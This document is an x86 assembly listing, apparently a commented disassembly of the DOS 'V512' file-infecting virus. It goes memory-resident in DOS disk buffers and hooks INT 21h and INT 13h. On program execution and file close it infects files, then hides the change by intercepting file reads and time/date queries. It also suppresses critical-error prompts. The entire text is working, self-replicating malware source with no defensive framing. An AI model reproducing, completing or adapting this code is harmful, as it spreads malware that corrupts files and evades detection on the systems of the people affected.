        name    a
code1   segment byte
        assume  cs:code1,ds:code1
        org     0004h
D4      =       $
        org     0050h
N50     =       $
        org     0100h
BegAddr    = $
Begin:
        mov     si,04h
        mov     ds,si
        lds     dx,dword ptr [si+08h]   ; get addr of int 13h into ds:dx
        mov     ah,013h
        int     02fh                 ; return orig addr of int 13 into ds:dx
        push    ds
        push    dx
        int     02fh
        pop     ax
        mov     di,offset BegAddr-8
        stosw                           ; store orig int13 addr offset
        pop     ax
        stosw                           ; and segment
        mov     ds,si
        lds     ax,dword ptr [si+040h]  ; get addr of int21 into ds:ax
        cmp     ax,0117h
        stosw                           ; store int21 addr offset
        mov     ax,ds
        stosw                           ; and segment
        push    es                      ; really this is prog_begin segment
        push    di                      ; and offset (0100 for .COM)
        jne     N130
        shl     si,1
        mov     cx,01ffh
        rep     cmpsb
        je      N177
N130:
        mov     ah,052h         ; DOS Fn - Get LIST of LISTS
        int     021h
        push    es              ; return: es:bx - pointer to DOS list of lists
        mov     si,0f8h         ; here was stored addres of int13
        les     di,es:[bx+12h]  ; pointer to first disk buffer
        mov     dx,es:[di+02]   ; pointer to next disk buffer
        mov     cx,207h         ; VirLen + 8
        rep     movs    byte ptr es:[di],byte ptr ss:[si] ; Move v512 into
                                                          ; first disk buffer
        mov     ds,cx           ; ds=0
        mov     di,016h
        mov     word ptr [di+06eh],0117h      ; set int21 to this offset
        mov     word ptr [di+070h],es         ; and segment
        pop     ds         ; restore pointer to DOS list of lists into ds:bx
        mov     word ptr [bx+014h],dx   ; set 2-nd disk buffer as first
                                        ; => hide 1-st disk buffer
        mov     dx,cs
        mov     ds,dx
        mov     bx,word ptr [di-014h]   ; get top of available system
                                        ; memory in paragraphs
        dec     bh                      ; and decement it
        mov     es,bx                   ; es=last memory segment
        cmp     dx,word ptr [di]        ; dx=Parents ID ?
        mov     ds,word ptr [di]        ; ds=PID
        mov     dx,word ptr [di]        ; dx=Parents PID !!!
        dec     dx
        mov     ds,dx                   ; ds=P PID-1 !!!
        mov     si,cx                   ; si=0
        mov     dx,di
        mov     cl,028h
        rep     movsw                   ; P PID-1:0 -> MemTop-1:16
        mov     ds,bx                   ; ds=MemTop-1
        jb      N186                    ; ?????
N177:
        mov     si,cx                   ; si=0
        mov     ds,word ptr ss:[si+02ch] ; ds=Segment address of DOS environment
N17d:
        lodsw
        dec     si
        or      ax,ax
        jne     N17d                    ; find filespec of THIS file !!!
        lea     dx,word ptr [si+03h]    ; and move pointer to ds:dx (FoolBoy!)
N186:
        mov     ax,03d00h         ; Open a File
        int     021h              ; AL     Open mode
                                  ; DS:DX  Pointer to filename (ASCIIZ string)
        xchg    ax,bx
        pop     dx
        push    dx
        push    cs
        pop     ds
        push    ds
        pop     es
        mov     cl,02h
        mov     ah,03fh
        int     021h            ; Read from File or Device, Using a Handle
                                ;  BX         File handle
                                ;  CX         Number of bytes to read
                                ;  DS:DX      Address of buffer
        mov     dl,cl
        xchg    cl,ch
        mov     al,byte ptr ds:BegAddr
        cmp     al,byte ptr ds:D2ff
        jne     N1a7
        mov     ah,03fh
N1a7:
        jmp     N50
GetFileTblNum:
        push    bx
        mov     ax,01220h            ; get system file table number
        int     02fh                 ; bx = file handle
        mov     bl,byte ptr es:[di]  ; = system file table entry number for
                                     ; file handle
        mov     ax,01216h            ; get address of system fcb
        int     02fh                 ; bx = system file table number
                                     ; return: ES:DI - system file table entry
        pop     bx
        lea     di,word ptr [di+015h]
        mov     bp,0200h
        ret
N1c0:
        mov     ah,03fh
N1c2:
        pushf
        push    cs
        call    N248
        ret
DOS_ReadFromFile:
        call    GetFileTblNum
        mov     si,word ptr es:[di]
        call    N1c0
        jb      N1f7
        cmp     si,bp
        jnb     N1f7
        push    ax
        mov     al,byte ptr es:[di-08h]
        not     al
        and     al,01fh
        jne     N1f6
        add     si,word ptr es:[di-04h]
        xchg    si,word ptr es:[di]
        add     word ptr es:[di-04h],bp
        call    N1c0
        sub     word ptr es:[di-04h],bp
        xchg    ax,si
        stosw
N1f6:
        pop     ax
N1f7:
        pop     es
        pop     si
        pop     di
        pop     bp
boza    proc    far
        ret     2
boza    endp

DOS_QueryFileTimeDate:                  ; AL : 0 to query the time/date of a file
        call    N1c2
D200    = $-1
        lahf
        mov     al,cl
        and     al,01fh
        cmp     al,01fh
D207    = $-1
        jne     N20c
        xor     cl,al
N20c:
        sahf
        jmp     N1f6
Int21Entry:
        push    bp
        push    di
        push    si
        push    es
        cld
        mov     bp,sp
        mov     es,word ptr [bp+0ah]
        mov     di,0117h
        mov     si,di
        cmps    word ptr cs:[si],word ptr es:[di]
        je      N244
        cmp     ah,03fh        ; DOS Fn 3fH: Read from File via Handle
        je      DOS_ReadFromFile
        push    ax
        cmp     ax,05700h      ; DOS Fn 57H: Set/Query File Time/Date
        je      DOS_QueryFileTimeDate
        cmp     ah,03eh        ; DOS Fn 3eH: Close a File Handle
        pushf
        push    bx
        push    cx
        push    dx
        push    ds
        je      DOS_CloseFileHandle
        cmp     ax,04b00h       ;  DOS Fn 4bH: Execute or Load a Program -- EXEC
        je      DOS_EXEC
INT21end:
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        popf
        je      N1f6
        pop     ax
N244:
        pop     es
        pop     si
        pop     di
        pop     bp
N248:
        jmp     dword ptr cs:D4                ; ?????
DOS_EXEC:
        mov     ah,03dh        ; DS:DX : address of an ASCIIZ string of a
        int     021h           ;         filespec
                               ; AL    : Open Mode
        xchg    ax,bx
DOS_CloseFileHandle:              ; BX : file handle
        call    GetFileTblNum
        jb      INT21end          ; exit on error
        xor     cx,cx
        xchg    cx,bp
        mov     ds,bp
        mov     si,04ch
        lodsw
        push    ax
        lodsw
        push    ax
        mov     ax,02524h               ; DOS Fn 25H: Set Interrupt Vector
        push    ax
        push    word ptr [si+040h]
        push    word ptr [si+042h]
        push    cs
        pop     ds                      ; AL    : interrupt number 24h
                                        ;  INT 24H: Critical Error Handler
        mov     dx,067h                 ; DS:DX : interrupt vector - address
        int     021h                    ;      of code to handle an interrupt
        lds     dx,dword ptr [si-050h]
        mov     al,013h                 ; AL    : interrupt number 13h
        int     021h                    ;  INT 13H: Disk I/O
        push    es
        pop     ds
        mov     word ptr [di],bp
        mov     byte ptr [di-013h],ch
        cmp     word ptr [di+014h],04d4fh
        jne     N2be
        mov     dx,word ptr [di-04h]
        add     dh,ch
        cmp     dh,04h
        jb      N2be
        test    byte ptr [di-011h],04h
        jne     N2be
        lds     si,dword ptr [di-0eh]
        cmp     byte ptr [si+04h],ch
        jbe     N2aa
        dec     dx
        shr     dh,1
        and     dh,byte ptr [si+04h]
        je      N2be
N2aa:
        mov     ds,bp
        mov     dx,cx
        call    N1c0
        mov     si,dx
        dec     cx
N2b4:
        lodsb
        cmp     al,byte ptr cs:Dfe07[si]
Dfe07=0fe07h
        jne     N2d1
        loop    N2b4
N2be:
        mov     ah,03eh
        call    N1c2
        pop     ds
        pop     dx
        pop     ax
        int     021h
N2c8:
        pop     ds
        pop     dx
        mov     al,013h
        int     021h
N2ce:
        jmp     INT21end
N2d1:
        mov     cx,dx
        mov     si,word ptr es:[di-04h]
        mov     word ptr es:[di],si
        mov     ah,040h
        int     021h
N2de:
        mov     al,byte ptr ds:D200
        push    es
        pop     ds
        mov     word ptr [di-04h],si
        mov     word ptr [di],bp
        or      byte ptr [di-08h],01fh
        push    cs
        pop     ds
        mov     byte ptr ds:D207,al
        mov     dx,08h
        mov     ah,040h
        int     021h
N2f8:
        or      byte ptr es:[di-0fh],040h
        jmp     N2be
D2ff    = $
N2ff:
        db      0e9h

        org     336h
N336    proc    near
N336    endp
code1   ends
        end     begin
